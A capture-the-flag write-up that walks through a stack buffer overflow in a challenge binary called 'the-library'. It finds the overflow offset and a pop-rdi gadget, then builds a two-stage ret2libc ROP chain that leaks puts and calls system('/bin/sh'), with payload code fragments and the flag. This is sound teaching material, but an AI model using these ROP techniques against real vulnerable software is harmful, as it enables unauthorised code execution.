# The Library

- Genre Pwn  

By examining the binary I found the followings  
```sh
file the-library
the-library: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=3067a5291814bef337dafc695eee28f371370eae, not stripped
checksec the-library
[*] 'the-library'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)

```
It was 64 bit binary and NX was enabled. So shellcode injection was not the right path.  
```sh
ldd the-library
	linux-vdso.so.1 (0x00007ffd6a1c8000)
	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007feee0cfe000)
	/lib64/ld-linux-x86-64.so.2 (0x00007feee0ede000)
ldd the-library
	linux-vdso.so.1 (0x00007ffe4053c000)
	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fae40077000)
	/lib64/ld-linux-x86-64.so.2 (0x00007fae40257000)
ldd the-library
	linux-vdso.so.1 (0x00007ffeeb549000)
	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007ffb33279000)
	/lib64/ld-linux-x86-64.so.2 (0x00007ffb33459000)
```
And as the ldd showed above, ASLR was enabled.  
I ran this binary first to see what it did.
```sh
./the-library 
Welcome to the library... What's your name?
TEST
Hello there: 
TEST

```
It accepted a user input and echoed back the name.  
This time I ran this with gdb to see more in depth.  

![image](https://user-images.githubusercontent.com/53568647/85946644-1f98ff00-b989-11ea-8dbc-da6bc5fcefba.png)

It crached when I input many characters as an input, so there was a possibility to cause buffer overflow to run shell.  
I sent a crafted input to find out the right buffer size. I used pattern_create and pattern_offset of gdb-peda.  

![image](https://user-images.githubusercontent.com/53568647/85946645-21fb5900-b989-11ea-94ed-5fdc73a7792e.png)

size of junk: 24 characters  

Unlike other easy challenges, there was no straight-to-win function in the binary to invoke shell. So my strategy was Return to Libc and calling system function.  
Since I did not know which address libc would be located at, I created a ROP chain to leak the address of puts.  

Since I found the address of main function, 0x0x400637, all I needed to find was ROP gadget. I searched for one pop and then return in the binary.  
```sh
rp -r 1 -f the-library | grep rdi
0x0040079f: add byte [rbp+rdi*8-0x01], bh ; call qword [rax+rax-0x02440000] ;  (1 found)
0x00400733: pop rdi ; ret  ;  (1 found)

# same results can be obtained by

r2 the-library
[0x00400550]> /R pop rdi
  0x00400733                 5f  pop rdi
  0x00400734                 c3  ret
```
gadget: 0x400733  

I got all the information required for the exploitation. Then I created exploit code next.  

## The first BoF
The first step was to leak the puts address by using ROP gadget. This main focus was placed to obtain the base address of libc.   
To do this, I used the gadget I just found in the previous step, and place the payload in this order, Gadget > puts GOT address > puts PLT address > main function.  
```sh
padding = 24
payload = b'A' * padding
payload += p64(popret)
payload += p64(puts_got)
payload += p64(puts_plt)
payload += p64(main_address)
```
It printed out the address of puts then returned to main function for another BoF.  
Using this leaked address I could calcurate the base of libc, puts_address - offset of puts.

## The second BoF
I tried to use system function to call /bin/sh. To do this, I needed an address of /bin/sh in the libc.  
```sh
strings -a -tx libc.so.6| grep /bin/sh
 1b3e9a /bin/sh
```
or either in my python exploit code
```python
sh_offset = next(libc.search(b'/bin/sh\x00'))
```
The address of system could be calcurated by adding the offset to the base of libc.  
The payload would be Gadget > address of /bin/sh > address of system.  
I made a huge mistake here, not considering the alignment of the stack. In x64 archtecture, it requires the stack to be 16 bytes aligned before any call instruction. That said, the number of 'ret' needed to be odd. So I added additional 'ret' on top of this payload. 'ret' could be found in the gadget, address of gadget + 1.    
```sh
payload = b'A' * padding
payload += p64(popret+1)
payload += p64(popret)
payload += p64(sh_address)
payload += p64(sys_address)
```
Then assembled all together to get the flag.  

## Exploit
I wrote a python exploit code and successfully spawned a shell then got a flag.    

![image](https://user-images.githubusercontent.com/53568647/85946651-26c00d00-b989-11ea-9922-98763d020cbd.png)

flag{jump_1nt0_th3_l1brary}
